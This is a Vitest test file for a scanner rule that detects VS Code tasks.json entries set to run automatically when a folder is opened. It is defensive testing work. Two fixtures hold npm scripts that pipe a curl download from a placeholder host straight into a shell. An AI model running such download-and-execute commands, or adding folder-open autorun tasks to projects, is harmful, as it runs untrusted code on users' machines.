import { describe, expect, it } from "vitest";
import type { RepoEntry, RepoSnapshot } from "../repo-snapshot.ts";
import { ideAutorun } from "./ide-autorun.ts";

function repo(files: Record<string, string>): RepoSnapshot {
  const entries: RepoEntry[] = Object.keys(files).map((path) => ({
    path,
    kind: "file",
    size: 1,
  }));
  return { entries, read: (path) => files[path] };
}

const tasks = (...list: object[]): string =>
  `// comment\n${JSON.stringify({ version: "2.0.0", tasks: list }, null, 2)}\n`;
const onOpen = { runOptions: { runOn: "folderOpen" } };

describe("repo/ide-autorun", () => {
  it("ignores tasks the user runs manually", () => {
    const files = {
      ".vscode/tasks.json": tasks({
        label: "build",
        type: "npm",
        script: "build",
      }),
    };
    expect(ideAutorun(repo(files))).toEqual([]);
  });

  it("blocks a shell command that runs when the folder is opened", () => {
    const files = {
      ".vscode/tasks.json": tasks({
        label: "prepare",
        type: "shell",
        command: "echo hi",
        ...onOpen,
      }),
    };
    expect(ideAutorun(repo(files))).toEqual([
      {
        ruleId: "repo/ide-autorun",
        severity: "block",
        file: ".vscode/tasks.json",
        line: expect.any(Number),
        message: expect.stringMatching(
          /"prepare" runs `echo hi` automatically when the folder is opened/,
        ),
      },
    ]);
  });

  it("joins command and args, and treats a task without a type as a command", () => {
    const files = {
      ".vscode/tasks.json": tasks({
        label: "x",
        command: "node",
        args: ["setup.js", "--quiet"],
        ...onOpen,
      }),
    };
    expect(ideAutorun(repo(files))[0]).toMatchObject({
      severity: "block",
      message: expect.stringContaining("`node setup.js --quiet`"),
    });
  });

  it("calls out a hidden terminal", () => {
    const task = {
      label: "x",
      type: "shell",
      command: "echo hi",
      presentation: { reveal: "never" },
      ...onOpen,
    };
    expect(
      ideAutorun(repo({ ".vscode/tasks.json": tasks(task) }))[0]?.message,
    ).toContain("terminal hidden");
  });

  it("warns for an npm script on folder open, and blocks if that script downloads and executes", () => {
    const task = { label: "watch", type: "npm", script: "dev", ...onOpen };
    const benign = {
      ".vscode/tasks.json": tasks(task),
      "package.json": JSON.stringify({ scripts: { dev: "vite" } }),
    };
    expect(ideAutorun(repo(benign))[0]).toMatchObject({
      severity: "warn",
      message: expect.stringContaining(`npm script "dev"`),
    });
    const evil = {
      ...benign,
      "package.json": JSON.stringify({
        scripts: { dev: "curl -s https://x.invalid/i | sh" },
      }),
    };
    expect(ideAutorun(repo(evil))[0]).toMatchObject({
      severity: "block",
      message: expect.stringContaining("downloads and executes"),
    });
  });

  it("resolves npm scripts against the package.json next to the .vscode folder", () => {
    const task = { label: "w", type: "npm", script: "dev", ...onOpen };
    const files = {
      "apps/web/.vscode/tasks.json": tasks(task),
      "apps/web/package.json": JSON.stringify({
        scripts: { dev: "curl https://x.invalid/i | bash" },
      }),
      "package.json": JSON.stringify({ scripts: { dev: "vite" } }),
    };
    expect(ideAutorun(repo(files))[0]).toMatchObject({
      severity: "block",
      file: "apps/web/.vscode/tasks.json",
    });
  });

  it("reports each folder-open task on its own line", () => {
    const files = {
      ".vscode/tasks.json": tasks(
        { label: "a", type: "shell", command: "echo a", ...onOpen },
        { label: "b", type: "shell", command: "echo b", ...onOpen },
      ),
    };
    const lines = ideAutorun(repo(files)).map((f) => f.line);
    expect(lines).toHaveLength(2);
    expect(lines[0]).not.toBe(lines[1]);
  });

  it("warns, not crashes, when tasks.json cannot be parsed", () => {
    expect(
      ideAutorun(repo({ ".vscode/tasks.json": "{ oops" }))[0],
    ).toMatchObject({
      severity: "warn",
      message: expect.stringContaining("could not be parsed"),
    });
  });

  it("skips tasks.json inside node_modules and other file names", () => {
    const evil = tasks({
      label: "x",
      type: "shell",
      command: "echo hi",
      ...onOpen,
    });
    expect(
      ideAutorun(
        repo({
          "node_modules/p/.vscode/tasks.json": evil,
          "docs/tasks.json": evil,
        }),
      ),
    ).toEqual([]);
  });
});
